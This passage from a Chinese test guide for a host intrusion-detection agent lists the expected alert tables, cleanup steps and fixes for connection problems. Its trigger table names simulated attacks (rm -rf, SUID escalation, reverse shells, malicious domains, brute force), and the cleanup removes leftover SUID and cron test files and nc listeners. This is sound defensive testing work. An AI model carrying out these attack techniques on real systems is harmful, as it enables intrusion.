| asset_image | > 0 条 | 需要有容器镜像 |
| asset_image_package | > 0 条 | 需要有运行中的容器 |

**告警数据：**

| 数据类别 | 预期 | 触发条件 |
|---------|------|---------|
| alert_dangerous_command | > 0 条 | 执行过 `rm -rf` 等高危命令后 |
| alert_privilege_escalation | > 0 条 | 触发过 SUID 提权后 |
| alert_reverse_shell | > 0 条 | 触发过反弹 Shell 后 |
| alert_malicious_request | > 0 条 | 访问过已知恶意域名后 |
| alert_file_integrity | > 0 条 | 修改过敏感路径文件后 |
| alert_brute_force | > 0 条 | 模拟过 SSH/FTP 暴力破解后 |
| alert_abnormal_login | > 0 条 | 从非白名单 IP 登录 SSH 后 |
| alert_malware_scan | > 0 条 | 执行过 EICAR 扫描后 |
| alert_network_attack | > 0 条 | 执行过攻击模拟请求后 |
| alert_container_reverse_shell | > 0 条 | 在容器内触发过反弹 Shell 后 |

**Baseline 数据：**

| 数据类别 | 预期 | 说明 |
|---------|------|------|
| baseline_check_result | > 0 条 | 下发过基线任务后 |
| baseline_check_detail | > 0 条 | 基线检查项明细 |

---

## 十三、测试后清理

### 13.1 停止服务

```bash
# 终端 A：停止 Agent（Ctrl+C）
```

> 远程 server 无需在本地停止，由远程服务器管理员管理。

### 13.2 验证 Agent 离线

Agent 断开后，远程 server 会更新连接状态：

```bash
PGPASSWORD=<DB_PASS> psql -h <REMOTE_IP> -p 5432 -U <DB_USER> -d soc -c \
  "SELECT agent_id, connection_status, last_connected_at FROM agent_info WHERE agent_id = '123456';"
```

`connection_status` 应为 0（离线）。

### 13.3 清理测试产物

告警测试过程中会在本地系统上创建临时文件，测试完成后需清理，避免残留影响系统安全或下次测试结果。

```bash
# --- 提权测试产物 ---
rm -f /tmp/suid_test_id          # SUID 提权测试二进制

# --- 文件完整性测试产物 ---
rm -f /etc/cron.d/ebpf_test_cron # crontab 测试文件

# --- 恶意软件扫描测试产物 ---
rm -f /root/eicar_test.com /root/eicar_1.exe /root/eicar_2.sh  # EICAR 测试文件

# --- 反弹 Shell 测试残留 ---
killall nc 2>/dev/null            # 清理 nc 监听进程
docker rm -f test-revshell 2>/dev/null  # 清理容器反弹Shell测试容器

# --- DNS 测试残留（如使用了无外网方案）---
systemctl start systemd-resolved 2>/dev/null  # 恢复 DNS 服务
```

> **重要**：SUID 文件（`/tmp/suid_test_id`）和 crontab 文件（`/etc/cron.d/ebpf_test_cron`）如果残留，可能被安全扫描工具误报或被攻击者利用，务必确认已删除。

### 13.4 清理测试数据（可选）

**方式一：使用清理脚本（全量清空）**

```bash
DB_HOST=<REMOTE_IP> DB_USER=<DB_USER> DB_PASS=<DB_PASS> bash scripts/clean-test-db.sh
```

**方式二：仅清理测试 Agent 数据**

```bash
PGPASSWORD=<DB_PASS> psql -h <REMOTE_IP> -p 5432 -U <DB_USER> -d soc
```

```sql
-- 清理测试 Agent 的所有数据
DELETE FROM asset_process WHERE agent_id = '123456';
DELETE FROM asset_port WHERE agent_id = '123456';
DELETE FROM asset_account WHERE agent_id = '123456';
DELETE FROM asset_system_service WHERE agent_id = '123456';
DELETE FROM asset_software WHERE agent_id = '123456';
DELETE FROM asset_kmod WHERE agent_id = '123456';
DELETE FROM asset_container WHERE agent_id = '123456';
DELETE FROM asset_image WHERE agent_id = '123456';
DELETE FROM asset_image_package WHERE agent_id = '123456';
DELETE FROM asset_web_service WHERE agent_id = '123456';
DELETE FROM asset_database WHERE agent_id = '123456';
DELETE FROM asset_env_suspicious WHERE agent_id = '123456';
DELETE FROM event_execve WHERE agent_id = '123456';
DELETE FROM event_connect WHERE agent_id = '123456';
DELETE FROM event_dns WHERE agent_id = '123456';
DELETE FROM event_file WHERE agent_id = '123456';
DELETE FROM alert_brute_force WHERE agent_id = '123456';
DELETE FROM alert_dangerous_command WHERE agent_id = '123456';
DELETE FROM alert_privilege_escalation WHERE agent_id = '123456';
DELETE FROM alert_reverse_shell WHERE agent_id = '123456';
DELETE FROM alert_abnormal_login WHERE agent_id = '123456';
DELETE FROM alert_malicious_request WHERE agent_id = '123456';
DELETE FROM alert_malware_scan WHERE agent_id = '123456';
DELETE FROM alert_network_attack WHERE agent_id = '123456';
DELETE FROM alert_file_integrity WHERE agent_id = '123456';
DELETE FROM alert_container_dangerous_command WHERE agent_id = '123456';
DELETE FROM alert_container_reverse_shell WHERE agent_id = '123456';
DELETE FROM baseline_check_detail WHERE agent_id = '123456';
DELETE FROM baseline_check_result WHERE agent_id = '123456';
DELETE FROM agent_info WHERE agent_id = '123456';
```

---

## 十四、常见问题

### 14.1 Agent 连接远程 server 失败

```
transport: Error while dialing: dial tcp <REMOTE_IP>:50051: connect: connection refused
```

**排查：**
1. 确认远程 server 已启动且监听 50051 端口：在远程服务器上执行 `ss -tlnp | grep 50051`
2. 确认 `agent.yaml` 中 `server` 地址为 `<REMOTE_IP>:50051`
3. 检查防火墙是否放行端口：`nc -zv <REMOTE_IP> 50051`
4. 检查安全组规则（云服务器需在控制台放行入站 50051 端口）

### 14.2 远程数据库中无数据

**排查：**
1. 确认远程 server 日志中有数据接收日志（需登录远程服务器查看）
2. 确认远程 server 数据库连接正常：检查启动日志无 `数据库初始化失败`
3. 检查远程 server 日志是否有写入错误：`写入失败` 关键字
4. 确认 Agent 已发送数据：Agent 日志中查看 transport 相关日志

### 14.3 无法连接远程数据库

```
psql: error: could not connect to server: Connection refused
```

**排查：**
1. 确认远程 PostgreSQL 服务运行中
2. 检查远程 PostgreSQL 的 `pg_hba.conf` 是否允许远程连接
3. 检查远程 PostgreSQL 的 `postgresql.conf` 中 `listen_addresses` 是否包含 `*` 或具体 IP
4. 检查防火墙是否放行 5432 端口：`nc -zv <REMOTE_IP> 5432`
5. 测试连接：`PGPASSWORD=<DB_PASS> psql -h <REMOTE_IP> -p 5432 -U <DB_USER> -d soc`

### 14.4 Collector 数据未写入

Collector 首轮采集有短暂延迟。如果等待超过 60 秒仍无数据：
1. 检查远程 server 日志中是否有 `handlePackagedData` 相关日志
2. 确认 Agent 启动时加载了 collector 插件

### 14.5 HTTP API 请求超时

远程模式下 HTTP API 请求可能因网络延迟较高而超时：

```bash
# 增加超时时间
curl --connect-timeout 10 --max-time 30 -X POST http://<REMOTE_IP>:8081/api/task ...
```

### 14.6 GeoIP 初始化失败

```
Failed to initialize GeoIP service
```

测试环境可在远程服务器的 `server.yaml` 中设置 `geoip.enabled: false`。GeoIP 仅影响告警中的 `source_location` 字段，不影响核心功能。
